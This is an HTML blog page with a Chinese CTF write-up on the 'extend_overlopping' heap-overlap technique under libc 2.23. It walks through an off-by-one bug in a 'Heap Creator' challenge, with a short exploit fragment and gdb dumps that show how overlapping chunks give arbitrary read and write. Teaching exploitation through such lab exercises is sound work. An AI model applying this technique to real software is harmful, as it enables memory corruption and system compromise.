@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="知识点 prev size的复用问题：学基础知识的时候知道有这么个概念，到这里才比较理解。其实很简单，例如我们malloc一个0xn8（除了0x8，因为64位chunk最小对齐到0x20）的chunk，实际上我们只会得到一个数据段大小为0xn0的chunk，剩下的八个字节就用与其相邻的那个chunk的prev size位来存储。 例如我们malloc(0x18)，实际上得到的chunk大小为0x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="extend_overlopping">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/extend-overlopping/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="知识点 prev size的复用问题：学基础知识的时候知道有这么个概念，到这里才比较理解。其实很简单，例如我们malloc一个0xn8（除了0x8，因为64位chunk最小对齐到0x20）的chunk，实际上我们只会得到一个数据段大小为0xn0的chunk，剩下的八个字节就用与其相邻的那个chunk的prev size位来存储。 例如我们malloc(0x18)，实际上得到的chunk大小为0x2">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-05-06T17:17:02.000Z">
+<meta property="article:modified_time" content="2022-05-06T19:04:25.035Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="堆">
+<meta property="article:tag" content="’extend_overlopping‘">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/extend-overlopping/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>extend_overlopping | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/extend-overlopping/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          extend_overlopping
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-07 01:17:02 / 修改时间：03:04:25" itemprop="dateCreated datePublished" datetime="2022-05-07T01:17:02+08:00">2022-05-07</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ol>
+<li><p>prev size的复用问题：学基础知识的时候知道有这么个概念，到这里才比较理解。其实很简单，例如我们malloc一个0xn8（除了0x8，因为64位chunk最小对齐到0x20）的chunk，实际上我们只会得到一个数据段大小为0xn0的chunk，剩下的八个字节就用与其相邻的那个chunk的prev size位来存储。</p>
+<p>例如我们<code>malloc(0x18)</code>，实际上得到的chunk大小为0x20，如下图，不够的八个字节用了top chunk的prev size来补</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1192020</span><br><span class="line">0x1192020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1192030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1192040:	0x6161616161616161	0x0000000000020fc1</span><br></pre></td></tr></table></figure>
+
+<p>这就有一个问题，比如当程序中存在off-by-one的时候，我们可以通过利用其复用prev size的特性，来让某一个chunk的数据区紧贴其下一个chunk的size位，这样我们就可以直接将下一个chunk的size的低一字节盖掉。</p>
+</li>
+<li><p>通过extend_overlopping利用fast bin来实现任意地址读写，具体在例题中说明。</p>
+</li>
+</ol>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>（libc-2.23下复现）</p>
+<p>首先是常规菜单</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;          Heap Creator          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Show a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Delete a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 5. Exit                        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体代码不贴了，简单说一下就行</p>
+<p>在<code>1. Create a heap</code>功能函数中程序要求我们输入heap的size以及content，程序会先malloc一个0x10大小的chunk用来保存content的size和content chunk的指针（低位八个字节保存size，高位八个字节保存chunk指针），可以理解为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span>* content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>并且这个用来记录heap信息的chunk被保存到了.bss段上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;heaparray + i) = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br></pre></td></tr></table></figure>
+
+<p>然后程序根据我们输入的size去<code>malloc(size);</code>，用这个chunk来保存content，并且我们输入的size无限制，create功能函数结束。</p>
+<p>edit功能函数中存在off-by-one</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">read_input(*(*(&amp;heaparray + v1) + <span class="number">1</span>), **(&amp;heaparray + v1) + <span class="number">1LL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>show功能函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size : %ld\nContent : %s\n&quot;</span>, **(&amp;heaparray + v1), *(*(&amp;heaparray + v1) + <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<p>delete功能函数，可以看到不存在uaf漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*(*(&amp;heaparray + v1) + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">  *(&amp;heaparray + v1) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="通过extend-overlopping利用fast-bin来实现任意地址读写的详解"><a href="#通过extend-overlopping利用fast-bin来实现任意地址读写的详解" class="headerlink" title="通过extend_overlopping利用fast bin来实现任意地址读写的详解"></a>通过extend_overlopping利用fast bin来实现任意地址读写的详解</h4><p>这种先申请一个chunk去保存别的chunk的信息和指针的题目就老会有各种问题</p>
+<p>我们想一想edit功能函数和show功能函数是根据什么去修改/查看堆内容的，显然是根据控制chunk中的size以及堆指针。那么如果我们能够修改这个控制chunk中的堆指针的话，我们不就能够利用edit和show功能函数去实现任意地址读写了吗？</p>
+<p>那么如何实现呢？这里有一个思路就是extend_overlopping，我们让content chunk跟控制chunk重叠，使得控制chunk成为content chunk的一部分，而由于edit功能函数的存在，content chunk中的内容我们肯定是可以控制的，那么如果我们完成了这样的一个堆重叠的话，就可以修改控制chunk中的堆指针了，从而完成任意地址读写。</p>
+<p>结合这一部分的exp详细演示一下吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x41&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先我们<code>malloc(0xn8);</code>，再<code>malloc(0x10);</code>，在例子中我malloc了0x18</p>
+<p>我们先理一下在<code>1. Create a heap</code>功能函数中程序是如何申请堆块的：①程序先<code>malloc(0x10);</code>，这个chunk用来保存我们输入的size的值以及content chunk指针（我们把这个chunk称为控制chunk）。②程序接着<code>malloc(size);</code>，这个chunk用来保存content。</p>
+<p>0xn8是因为我们得先让chunk间存在prev size的复用，然后我们才能够用off-by-one修改相邻chunk的size位</p>
+<p>再申请一个0x10的chunk是为了得到一个跟控制chunk大小相同的chunk</p>
+<p>此时堆长这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021	=&gt;保存堆指针的chunk1</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021	=&gt;我们申请的0x18的chunk2</span><br><span class="line">0x12a6030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6040:	0x6161616161616161	0x0000000000000021	=&gt;保存堆指针的chunk3</span><br><span class="line">0x12a6050:	0x0000000000000010	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021	=&gt;我们申请的0x10的chunk4</span><br><span class="line">0x12a6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>
+
+<p>为了方便叙述我们将以上几块chunk分别称作chunk1/2/3/4。</p>
+<p>然后利用chunk2的off-by-one修改chunk3的大小，使其大小足以覆盖整个chunk4，这里我们将其修改成0x41</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6030:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x12a6040:	0x6262626262626262	0x0000000000000041 =&gt;这里已经被修改</span><br><span class="line">0x12a6050:	0x0000000000000010	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>
+
+<p>接下来用delete功能函数free掉chunk4，那么总共会free掉两个chunk：保存堆指针的chunk3以及保存内容的chunk4。但是由于chunk3的大小被我们修改成0x41，所以chunk3会进入到0x40的fast bin链中，chunk4正常进入0x20的fast bin链中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x12a6060 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x12a6040 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>
+
+<p>最后我们<code>malloc(0x30);</code>，那么我们就会得到一个0x20和一个0x40大小的chunk，这两个chunk从fast bin中取，并且0x20的chunk用作控制chunk，0x40的chunk用来保存content</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6030:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x12a6040:	0x6262626262626262	0x0000000000000041 =&gt;这时这块0x40的chunk是content chunk</span><br><span class="line">0x12a6050:	0x0000000000000061	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021 =&gt;这块0x20的chunk是控制chunk</span><br><span class="line">0x12a6070:	0x0000000000000030	0x00000000012a6050</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>
+
+<p>到这里我们应该就能发现，我们最后得到的0x20的chunk是包含在0x40的chunk中的，我们就由此完成了通过堆重叠来修改堆指针的过程，那么我们只需要修改控制chunk中的指针，实现的就是任意地址读写的效果。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E5%A0%86/" rel="tag"># 堆</a>
+              <a href="/tags/%E2%80%99extend-overlopping%E2%80%98/" rel="tag"># ’extend_overlopping‘</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/05/%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one/" rel="prev" title="堆利用-off_by_one">
+      <i class="fa fa-chevron-left"></i> 堆利用-off_by_one
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/07/Unlink/" rel="next" title="Unlink">
+      Unlink <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87extend-overlopping%E5%88%A9%E7%94%A8fast-bin%E6%9D%A5%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99%E7%9A%84%E8%AF%A6%E8%A7%A3"><span class="nav-number">2.1.</span> <span class="nav-text">通过extend_overlopping利用fast bin来实现任意地址读写的详解</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
